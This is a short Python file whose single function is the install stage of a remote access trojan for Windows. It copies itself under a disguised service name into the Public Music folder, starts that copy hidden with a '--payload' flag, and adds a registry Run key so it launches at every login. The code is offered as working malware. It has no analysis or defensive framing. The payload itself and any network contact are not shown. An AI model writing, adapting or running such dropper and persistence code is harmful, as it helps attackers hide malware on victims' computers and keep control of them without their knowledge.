import sys
import os
import shutil
import subprocess
import winreg

def install_and_launch_rat():
    public_path = os.getenv('PUBLIC')
    target_folder = os.path.join(public_path, "Music")

    hidden_name = "SystemRATService.exe"
    hidden_path = os.path.join(target_folder, hidden_name)

    if getattr(sys, 'frozen', False): # Check if running as a bundled executable
        current_exe = sys.executable
    else:
        current_exe = __file__

    if current_exe != hidden_path:
        try:
            if not os.path.exists(hidden_path): # Copy to hidden location if not already present
                shutil.copyfile(current_exe, hidden_path)

            subprocess.Popen([hidden_path, "--payload"], creationflags=subprocess.CREATE_NO_WINDOW) # Launch the copied executable
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "SystemRATService", 0, winreg.REG_SZ, hidden_path) # Set registry for persistence  
            winreg.CloseKey(key)

        except Exception as e:
            print(f"Error during installation: {e}")
                